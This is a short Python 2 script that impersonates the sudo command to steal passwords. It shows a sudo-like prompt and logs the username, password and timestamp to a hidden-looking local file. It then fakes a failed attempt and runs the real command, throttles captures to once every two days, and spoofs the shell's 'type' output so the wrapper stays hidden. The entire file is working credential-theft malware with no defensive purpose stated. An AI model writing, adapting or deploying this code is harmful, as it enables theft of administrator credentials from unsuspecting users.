#! /usr/bin/python
# -*- coding: UTF-8 -*-
from getpass import *
import time
import os
import sys


catchFile = "--catched--"




def fakeSudo():
	def savePass(passwd):
		try:
			file = open(catchFile, 'a')		
		except:
			file = open(catchFile, 'w')		

		catch = "%s|%s|%s\n" % (getuser(), passwd, str(time.time()))
		file.write(catch)
		file.close()

	def checkForTime():
		"Function for making pauses betwen catching passes"
		now = time.time()
		minDelay = 2*24*60*60 # min delay is two days
		
		try:
			file = open(catchFile, 'r')
			data = file.read()
			
			for line in data.splitlines():
				if now - float(line.split("|")[2]) < minDelay: # if the command was runned not more than two days ago
					return False
			return True # if code didnot returned anything yet then return true - there is no exception
		
		except:
			return True

	if checkForTime():
		# Catch pass:
		try:
			passwd = getpass("[fakesudo] password for %s: " % getuser())
		except KeyboardInterrupt:
			passwd = getpass("Password: ")
		# Save pass:
		savePass(passwd)

		# for some reason sudo have ~2 s pouse. 
		time.sleep(2)
		print "Sorry, try again."
	else:
		pass
		
	# Do the command: 
	sudocmd = " ".join(sys.argv[1:])
	os.system(sudocmd)


def fakeType():
	def typeType():
		print "type is a shell builtin"	
	
	def typeSudo():
		print "sudo is /usr/bin/sudo"
	
	try:
		args = sys.argv[2:]  
		if args:
			for arg in args:
				if arg == "type":
					typeType()
				elif arg == "sudo":
					typeSudo()
				else:
					os.system("type %s" % arg)
	except:
		pass
	
	
try:
	mode = sys.argv[1]
except:
	print "You must specify what to do!"
	exit()





if mode == "sudo":	
	fakeSudo()

if mode == "type":
	fakeType()










